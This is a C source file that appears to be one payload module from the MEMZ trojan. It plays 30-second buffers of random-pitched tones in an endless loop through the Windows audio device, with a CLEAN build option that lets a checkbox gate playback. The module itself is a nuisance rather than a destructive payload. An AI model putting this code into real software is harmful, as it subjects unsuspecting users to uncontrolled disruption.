#include "../MEMZ.h"

PAYLOADHOST(payloadCrazyBus) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);

	const int bufsize = 44100 * 30; // 30 Seconds
	char *wavedata = (char *)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			int freq = 0;
			for (int i = 0; i < bufsize; i++) {
				if (i % (44100 / 4) == 0)
					freq = 44100 / ((random() % 4000) + 1000);

				wavedata[i] = (char)(((i % freq) / ((float)freq)) * 100);
			}

#ifdef CLEAN
			waveOutReset(hwo);
#endif
			waveOutWrite(hwo, &hdr, sizeof(hdr));

			while (!(hdr.dwFlags & WHDR_DONE)
#ifdef CLEAN
				&&  (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED)
#endif
				) {
				Sleep(1);
			}

#ifdef CLEAN
			if (!enablePayloads || SendMessage(payload->btn, BM_GETCHECK, 0, NULL) != BST_CHECKED) {
				waveOutPause(hwo);
			}
		} else {
			Sleep(10);
		}
#endif
	}
}